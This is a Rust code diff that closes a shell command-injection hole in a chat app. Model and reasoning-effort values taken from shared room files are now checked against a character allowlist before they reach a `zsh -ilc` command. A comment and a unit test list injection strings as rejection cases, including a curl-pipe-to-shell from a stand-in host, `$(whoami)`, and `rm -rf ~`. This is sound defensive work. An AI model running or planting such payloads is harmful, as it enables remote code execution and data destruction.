@@ -16,6 +16,36 @@ pub fn split_external_model(model: &str) -> (&str, Option<&str>, Option<&str>) {
     (engine, parts.next(), parts.next())
 }
 
+/// Chars a model slug or reasoning-effort level may contain before it is
+/// allowed to become a word in the `zsh -ilc` command line that runs a cloud
+/// CLI. Real values are picker slugs (`gpt-5.6-sol`, `opus`, `claude-opus-4-8`)
+/// and levels (`high`, `xhigh`) — this is deliberately narrower than "escape
+/// the quotes" because there is no legitimate slug that needs a quote, a space,
+/// a `$` or a `;`, and an allowlist cannot be out-thought the way an escaper can.
+fn is_cli_slug(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 64
+        && s.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '/'))
+}
+
+/// `Ok(None)` for absent/empty, `Ok(Some(s))` for a well-formed slug, and an
+/// error naming the field for anything else. The room's `model` setting travels
+/// inside a shareable room file, so this is the boundary where a value stops
+/// being data and starts being shell.
+fn check_cli_slug<'a>(v: Option<&'a str>, field: &str) -> Result<Option<&'a str>, String> {
+    match v {
+        None => Ok(None),
+        Some(s) if s.is_empty() => Ok(None),
+        Some(s) if is_cli_slug(s) => Ok(Some(s)),
+        Some(_) => Err(format!(
+            "This room's {field} setting isn't a valid name, so it was not run. \
+             Pick the engine again in Settings."
+        )),
+    }
+}
+
 pub fn is_external_engine(model: &str) -> bool {
     let base = split_external_model(model).0;
     base == "claude-cli" || base == "codex-cli" || base == "openrouter"
@@ -711,14 +741,19 @@ pub(crate) async fn run_external(
             _ => {}
         }
     }
-    // Single-quoted, matching the mcp_config_path quoting just above — safe
-    // here because submodel/effort are always our own known slugs (a Codex
-    // catalog slug + level, or a Claude Code alias + --effort value), never
-    // arbitrary user text. The Claude alias is scraped from the installed CLI
-    // rather than hardcoded, so what upholds that is `claude_label_head`'s
-    // charset: a slug can only ever be 2-16 lowercase ASCII letters, and no
-    // quote or metacharacter can reach one. Effort is only meaningful with a
-    // chosen model.
+    // Single-quoted, matching the mcp_config_path quoting just above — but the
+    // quoting is NOT what makes this safe, and the previous comment here was
+    // wrong to say the picker's charset was. `submodel`/`effort` are the tail of
+    // the room's `model` setting, which lives in the room's own database: a
+    // .arcelle file someone sends you can arrive with
+    // `claude-cli::x'; curl … | sh; '` already stored, and the very first chat
+    // turn would run it under `zsh -ilc`. Nothing between `set_setting` and here
+    // looked at the characters. So the charset is CHECKED, at the one place the
+    // value becomes a shell word, and a value that fails is a hard error rather
+    // than a dropped flag — silently running a different model than the room
+    // says is exactly the kind of unevidenced success this app doesn't do.
+    let submodel = check_cli_slug(submodel, "model")?;
+    let effort = check_cli_slug(effort, "reasoning effort")?;
     let model_flag = submodel
         .map(|m| format!(" --model '{m}'"))
         .unwrap_or_default();
@@ -956,6 +991,43 @@ fn parse_codex_json_stream(stdout: &[u8]) -> (String, ExternalUsage) {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn cli_slug_rejects_anything_that_could_break_out_of_the_shell_word() {
+        // What the picker really produces has to keep working…
+        for good in [
+            "gpt-5.6-sol",
+            "opus",
+            "claude-opus-4-8",
+            "high",
+            "xhigh",
+            "gpt-oss:120b",
+        ] {
+            assert_eq!(check_cli_slug(Some(good), "model").unwrap(), Some(good));
+        }
+        assert_eq!(check_cli_slug(None, "model").unwrap(), None);
+        // "codex-cli::" — a tail that is there but empty means "no model".
+        assert_eq!(check_cli_slug(Some(""), "model").unwrap(), None);
+
+        // …and the room-file attack must not reach `zsh -ilc`. The `model`
+        // setting is stored inside the room, so a .arcelle someone sends you can
+        // arrive carrying any of these.
+        for evil in [
+            "x'; curl http://evil/sh | sh; '",
+            "opus' -c 'x",
+            "$(whoami)",
+            "`id`",
+            "a; rm -rf ~",
+            "a\nrm -rf ~",
+            "-rf",
+        ] {
+            let err = check_cli_slug(Some(evil), "model").unwrap_err();
+            assert!(
+                err.contains("model"),
+                "{evil:?} was accepted as a shell word"
+            );
+        }
+    }
 
     #[test]
     fn split_external_model_handles_bare_model_and_effort() {
